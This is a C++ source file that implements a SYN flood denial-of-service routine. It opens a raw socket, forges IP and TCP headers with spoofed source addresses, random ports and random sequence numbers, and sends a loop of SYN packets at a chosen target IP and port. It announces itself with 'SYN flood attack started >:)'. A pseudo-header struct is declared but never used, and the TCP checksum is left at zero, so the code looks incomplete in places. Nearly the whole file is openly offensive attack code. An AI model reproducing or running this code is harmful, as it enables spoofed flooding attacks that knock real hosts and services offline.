#include "syn.h"

// Pseudo-header structure for TCP checksum calculation
struct PseudoHeader {
    uint32_t source_ip;
    uint32_t dest_ip;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Compute checksum
/**
 * @brief Compute the checksum of a block of data.
 *
 * @param data A pointer to the data to be checksummed.
 * @param len The length of the data in bytes.
 *
 * @return The checksum of the data.
 */
unsigned short checksum(void* data, int len) {
    unsigned short* ptr = (unsigned short*)data;
    unsigned long sum = 0;
    
    // Iterate over the data in 16-bit words
    while (len > 1) {
        // Add the current word to the sum
        sum += *ptr++;
        // Decrement the length by 2 bytes
        len -= 2;
    }
    // If there is a single byte left, add it to the sum
    if (len) sum += *(unsigned char*)ptr;

    // Perform the standard checksum folding
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);

    // Return the negation of the sum
    return ~sum;
}

// SYN flood function
void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
    std::cout << "SYN flood attack started >:)\n";
    std::cout << "Target IP: " << target_ip << ", Port: " << target_port << ", Packets: " << packet_count << "\n";

    // Create a raw socket to send TCP packets
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Enable IP header inclusion
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    // Target address structure
    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    // Packet buffer to hold IP and TCP headers
    char packet[sizeof(iphdr) + sizeof(tcphdr)] = {0};

    // Pointers to IP and TCP headers
    iphdr* ip = (iphdr*)packet;
    tcphdr* tcp = (tcphdr*)(packet + sizeof(iphdr));

    for (int i = 0; i < packet_count; i++) {
        // Generate a random source IP (spoofing)
        std::string spoofed_ip = "192.168.1." + std::to_string(rand() % 255);
        inet_pton(AF_INET, spoofed_ip.c_str(), &ip->saddr);
        
        // Fill in IP header fields
        ip->ihl = 5;  // IP header length
        ip->version = 4;  // IPv4
        ip->tos = 0;  // Type of service
        ip->tot_len = htons(sizeof(packet));  // Total packet length
        ip->id = htons(rand() % 65535);  // Random packet ID
        ip->frag_off = 0;  // No fragmentation
        ip->ttl = 64;  // Time-to-live
        ip->protocol = IPPROTO_TCP;  // Protocol type (TCP)
        ip->daddr = target_addr.sin_addr.s_addr;  // Destination IP
        ip->check = checksum(ip, sizeof(iphdr));  // Compute IP header checksum

        // Fill in TCP header fields
        tcp->source = htons(rand() % 65535);  // Random source port
        tcp->dest = htons(target_port);  // Destination port
        tcp->seq = rand();  // Random sequence number
        tcp->ack_seq = 0;  // No acknowledgment
        tcp->doff = 5;  // Data offset (header size)
        tcp->syn = 1;  // SYN flag set
        tcp->window = htons(65535);  // Window size
        tcp->check = 0;  // Checksum will be calculated later

        // Send the SYN packet
        if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            perror("Failed to send packet");
        }

        usleep(1000);  // Small delay to avoid overwhelming the system
    }

    close(sock);  // Close the socket after sending packets
    std::cout << "SYN flood attack finished.\n";
}